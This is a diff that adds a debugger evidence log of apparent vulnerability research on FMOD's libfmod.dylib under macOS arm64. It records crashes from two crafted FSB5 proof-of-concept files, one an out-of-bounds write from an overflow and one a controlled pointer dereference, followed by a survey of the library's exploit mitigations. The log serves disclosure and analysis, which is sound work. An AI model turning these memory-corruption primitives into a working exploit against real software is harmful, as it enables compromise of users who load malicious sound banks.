@@ -1,0 +1,102 @@
+FMOD libfmod.dylib native register-control evidence  (macOS arm64, this machine)
+date: 2026-10-19T19:06:01Z   host: Darwin 25.5.0 arm64
+lib : FMOD 2.02.22  downloads/fmod_2_02_22_laguna/libfmod.dylib  (sha256 67b100ecefc7822a3ee870f85f727aaddc55486fd89610791af54384a8dd0caa)
+     codesign: CodeDirectory v=20500 size=9427 flags=0x10000(runtime) hashes=289+2 location=embedded TeamIdentifier=FNXNE97GV7 
+probe: harness/fsb5_probe (arm64)  path = createSound(bank, 0x2080=OPENONLY|CREATESTREAM, NULL)
+============================================================================
+
+########## RUN A — poc_v2 (numSamples*4 32-bit overflow) : controlled OOB WRITE ##########
+(lldb) target create "harness/fsb5_probe"
+Current executable set to '/Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/harness/fsb5_probe' (arm64).
+(lldb) settings set -- target.run-args  "downloads/fmod_2_02_22_laguna/libfmod.dylib" "../samples/poc_v2_numsamples_oob.fsb" "0x2080" "0x00020222"
+(lldb) run
+PROBE: System_Create -> 0 FMOD_OK
+PROBE: lib reports version 0x00020222
+PROBE: SetOutput(NOSOUND) -> 0 FMOD_OK
+PROBE: Init -> 0 FMOD_OK
+PROBE: calling CreateSound("../samples/poc_v2_numsamples_oob.fsb", mode=0x2080) ...
+Process 16756 launched: '/Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/harness/fsb5_probe' (arm64)
+Process 16756 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x1009e4000)
+    frame #0: 0x0000000104d192b4 libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 196
+libfmod.dylib`___lldb_unnamed_symbol_b51f0:
+->  0x104d192b4 <+196>: str    w10, [x0, x8, lsl #2]
+    0x104d192b8 <+200>: ldrb   w10, [x9], #0x8
+    0x104d192bc <+204>: tbz    w10, #0x0, 0x104d192fc    ; <+268>
+    0x104d192c0 <+208>: ldr    w10, [x9], #0x4
+Target 0: (fsb5_probe) stopped.
+(lldb) register read pc x0 x8 x9 x10 lr
+      pc = 0x0000000104d192b4  libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 196
+      x0 = 0x0000000100607e78
+      x8 = 0x00000000000f7062
+      x9 = 0x0000000101b0c5cf
+     x10 = 0x0000000001516a17
+      lr = 0x0000000104d19298  libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 168
+(lldb) p/x $x0 + ($x8 << 2)
+(unsigned long) 0x00000001009e4000
+(lldb) image list -b -o -f libfmod.dylib
+[  0] libfmod.dylib 0x0000000104c64000 /Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/downloads/fmod_2_02_22_laguna/libfmod.dylib
+(lldb) thread backtrace
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x1009e4000)
+  * frame #0: 0x0000000104d192b4 libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 196
+    frame #1: 0x0000000104d195cc libfmod.dylib`___lldb_unnamed_symbol_b53d4 + 504
+    frame #2: 0x0000000104ce50e0 libfmod.dylib`___lldb_unnamed_symbol_80f94 + 332
+    frame #3: 0x0000000104ce5ee0 libfmod.dylib`___lldb_unnamed_symbol_819c0 + 1312
+    frame #4: 0x0000000104ccdc88 libfmod.dylib`FMOD::System::createSound(char const*, unsigned int, FMOD_CREATESOUNDEXINFO*, FMOD::Sound**) + 112
+    frame #5: 0x0000000100000920 fsb5_probe`main(argc=5, argv=0x000000016fdfec98) at fsb5_probe.c:123:9
+    frame #6: 0x00000001867dbe00 dyld`start + 6992
+(lldb) quit
+
+########## RUN B — poc_v3 (type-6 chunk, 24-bit size) : attacker-controlled DEREF ADDRESS ##########
+(lldb) target create "harness/fsb5_probe"
+Current executable set to '/Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/harness/fsb5_probe' (arm64).
+(lldb) settings set -- target.run-args  "downloads/fmod_2_02_22_laguna/libfmod.dylib" "../samples/poc_v3_type6_bigsize.fsb" "0x2080" "0x00020222"
+(lldb) run
+PROBE: System_Create -> 0 FMOD_OK
+PROBE: lib reports version 0x00020222
+PROBE: SetOutput(NOSOUND) -> 0 FMOD_OK
+PROBE: Init -> 0 FMOD_OK
+PROBE: calling CreateSound("../samples/poc_v3_type6_bigsize.fsb", mode=0x2080) ...
+Process 16765 launched: '/Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/harness/fsb5_probe' (arm64)
+Process 16765 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x9ad800000)
+    frame #0: 0x0000000104d652e0 libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 240
+libfmod.dylib`___lldb_unnamed_symbol_b51f0:
+->  0x104d652e0 <+240>: ldr    w14, [x13]
+    0x104d652e4 <+244>: rev    w14, w14
+    0x104d652e8 <+248>: str    w14, [x13], #0x4
+    0x104d652ec <+252>: subs   x12, x12, #0x1
+Target 0: (fsb5_probe) stopped.
+(lldb) register read pc x0 x9 x10 x11 x13
+      pc = 0x0000000104d652e0  libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 240
+      x0 = 0x0000000100653698
+      x9 = 0x00000009ad005914
+     x10 = 0x000000000dfffffe
+     x11 = 0x0000000000ffffff
+     x13 = 0x00000009ad800000
+(lldb) image list -b -o -f libfmod.dylib
+[  0] libfmod.dylib 0x0000000104cb0000 /Users/kfinisterre/Desktop/FMOD/poc-fsb5/sdk-bisect/downloads/fmod_2_02_22_laguna/libfmod.dylib
+(lldb) thread backtrace
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x9ad800000)
+  * frame #0: 0x0000000104d652e0 libfmod.dylib`___lldb_unnamed_symbol_b51f0 + 240
+    frame #1: 0x0000000104d655cc libfmod.dylib`___lldb_unnamed_symbol_b53d4 + 504
+    frame #2: 0x0000000104d310e0 libfmod.dylib`___lldb_unnamed_symbol_80f94 + 332
+    frame #3: 0x0000000104d31ee0 libfmod.dylib`___lldb_unnamed_symbol_819c0 + 1312
+    frame #4: 0x0000000104d19c88 libfmod.dylib`FMOD::System::createSound(char const*, unsigned int, FMOD_CREATESOUNDEXINFO*, FMOD::Sound**) + 112
+    frame #5: 0x0000000100000920 fsb5_probe`main(argc=5, argv=0x000000016fdfec98) at fsb5_probe.c:123:9
+    frame #6: 0x00000001867dbe00 dyld`start + 6992
+(lldb) quit
+
+########## HARDENING (arm64 slice) ##########
+-- cpusubtype (arm64 vs arm64e/PAC):
+    cpusubtype CPU_SUBTYPE_ARM64_ALL
+-- PAC instructions (pac*/aut*/braa/blraa/retab):
+0
+-- plain indirect branches blr/br xN:
+1200
+-- stack canary import:
+0x00000000000f8010  1232 ___stack_chk_guard
+-- segment maxprot (DEP, no RWX):
+   __TEXT   maxprot 0x00000005
+   __DATA_CONST   maxprot 0x00000003
+   __DATA   maxprot 0x00000003
